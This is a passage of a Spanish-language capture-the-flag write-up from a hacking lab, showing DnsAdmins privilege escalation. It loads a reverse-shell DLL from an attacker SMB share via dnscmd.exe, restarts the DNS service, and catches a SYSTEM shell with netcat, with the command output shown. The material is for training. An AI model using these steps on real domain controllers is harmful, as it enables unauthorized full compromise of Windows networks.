+<li>Desde nuestra sesión de <strong>Evil-WinRM</strong>, usaremos el <strong>binario dnscmd.exe</strong> para interactuar directamente con el <strong>archivo DLL</strong> que tenemos en el <strong>servidor SMB</strong> con tal de pasarlo a la memoria como <strong>SYSTEM</strong>, y usando los parámetros <strong>config y serverlevelplugindll</strong>, le damos la ruta de nuestro servidor:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Suneo\Desktop&gt; dnscmd.exe /config /serverlevelplugindll \\Tu_IP\smbFolder\revShell.dll
+</span></span><span style="display:flex;"><span>Propiedad del Registro serverlevelplugindll restablecida correctamente.
+</span></span><span style="display:flex;"><span>Comando completado correctamente.
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>dnscmd.exe</em></td>
+					<td>Herramienta de línea de comandos para administrar servidores DNS.</td>
+			</tr>
+			<tr>
+					<td><em>/config</em></td>
+					<td>Subcomando que modifica la configuración del servidor.</td>
+			</tr>
+			<tr>
+					<td><em>/serverlevelplugindll</em></td>
+					<td>Indica que se quiere establecer una DLL personalizada para ejecutar en el contexto del servicio DNS (dnssvc).</td>
+			</tr>
+			<tr>
+					<td><em>ruta_dll</em></td>
+					<td>La ruta completa hacia el archivo .dll que se quiere cargar como plugin.</td>
+			</tr>
+	</tbody>
+</table>
+<ul>
+<li>Por último, reiniciamos el <strong>servicio DNS</strong> usando el <strong>comando sc.exe</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Suneo\Desktop&gt; sc.exe stop dns
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>NOMBRE_SERVICIO: dns
+</span></span><span style="display:flex;"><span>        TIPO               : 10  WIN32_OWN_PROCESS
+</span></span><span style="display:flex;"><span>        ESTADO             : 3  STOP_PENDING
+</span></span><span style="display:flex;"><span>                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+</span></span><span style="display:flex;"><span>        CàD_SALIDA_WIN32   : 0  (0x0)
+</span></span><span style="display:flex;"><span>        CàD_SALIDA_SERVICIO: 0  (0x0)
+</span></span><span style="display:flex;"><span>        PUNTO_COMPROB.     : 0x1
+</span></span><span style="display:flex;"><span>        INDICACIàN_INICIO  : 0x7530
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Suneo\Desktop&gt; sc.exe start dns
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>NOMBRE_SERVICIO: dns
+</span></span><span style="display:flex;"><span>        TIPO               : 10  WIN32_OWN_PROCESS
+</span></span><span style="display:flex;"><span>        ESTADO             : 2  START_PENDING
+</span></span><span style="display:flex;"><span>                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+</span></span><span style="display:flex;"><span>        CàD_SALIDA_WIN32   : 0  (0x0)
+</span></span><span style="display:flex;"><span>        CàD_SALIDA_SERVICIO: 0  (0x0)
+</span></span><span style="display:flex;"><span>        PUNTO_COMPROB.     : 0x1
+</span></span><span style="display:flex;"><span>        INDICACIàN_INICIO  : 0x4e20
+</span></span><span style="display:flex;"><span>        PID                : 2044
+</span></span><span style="display:flex;"><span>        MARCAS         :
+</span></span></code></pre></div><ul>
+<li>Observa que después de reiniciar el <strong>servicio DNS</strong>, hubo una conexión a nuestro <strong>servidor SMB</strong> que parece está ejecutando el <strong>archivo DLL</strong> que tiene nuestra <strong>Reverse Shell</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-smbserver smbFolder <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span> -smb2support
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Incoming connection <span style="color:#f92672">(</span>192.168.10.5,49702<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> AUTHENTICATE_MESSAGE <span style="color:#f92672">(</span>DORAEMON<span style="color:#ae81ff">\W</span>IN-VRU3GG3DPLJ$,WIN-VRU3GG3DPLJ<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> User WIN-VRU3GG3DPLJ<span style="color:#ae81ff">\W</span>IN-VRU3GG3DPLJ$ authenticated successfully
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WIN-VRU3GG3DPLJ$::DORAEMON:aaaaaaaaaaaaaaaa:d75522782ff4a27cc3132124...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting Share<span style="color:#f92672">(</span>1:IPC$<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting Share<span style="color:#f92672">(</span>2:smbFolder<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Disconnecting Share<span style="color:#f92672">(</span>1:IPC$<span style="color:#f92672">)</span>
+</span></span></code></pre></div><ul>
+<li>Y observa la <strong>netcat</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>rlwrap nc -nlvp 443
+</span></span><span style="display:flex;"><span>listening on [any] 443 ...
+</span></span><span style="display:flex;"><span>connect to [Tu_IP] from (UNKNOWN) [192.168.10.5] 49703
+</span></span><span style="display:flex;"><span>Microsoft Windows [Versi�n 10.0.14393]
+</span></span><span style="display:flex;"><span>(c) 2016 Microsoft Corporation. Todos los derechos reservados.
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>C:\Windows\system32<span style="color:#75715e">&gt;whoami</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority\system
+</span></span></code></pre></div><p>Estamos dentro.</p>
+<p>Ya solo tenemos que buscar la última flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\Windows\system32<span style="color:#75715e">&gt;cd C:\Users\Administrador\Desktop</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cd</span> C:\Users\Administrador\Desktop
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>C:\Users\Administrador\Desktop<span style="color:#75715e">&gt;type root.txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> root.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Y con esto, terminamos la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://github.com/ropnop/kerbrute" target="_blank" rel="noopener noreferrer">https://github.com/ropnop/kerbrute</a></li><li><a href="https://github.com/peass-ng/PEASS-ng/tree/master" target="_blank" rel="noopener noreferrer">https://github.com/peass-ng/PEASS-ng/tree/master</a></li><li><a href="https://github.com/61106960/adPEAS/tree/main" target="_blank" rel="noopener noreferrer">https://github.com/61106960/adPEAS/tree/main</a></li><li><a href="https://github.com/SpecterOps/BloodHound" target="_blank" rel="noopener noreferrer">https://github.com/SpecterOps/BloodHound</a></li><li><a href="https://github.com/SpecterOps/SharpHound" target="_blank" rel="noopener noreferrer">https://github.com/SpecterOps/SharpHound</a></li><li><a href="https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart" target="_blank" rel="noopener noreferrer">https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart</a></li><li><a href="https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/" target="_blank" rel="noopener noreferrer">https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/</a></li><li><a href="https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b" target="_blank" rel="noopener noreferrer">https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b</a></li><li><a href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=dnsadmins#dnsadmins" target="_blank" rel="noopener noreferrer">https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=dnsadmins#dnsadmins</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-findMe/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Find Me - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-jaulaCon2025/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">JaulaCon2025 - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
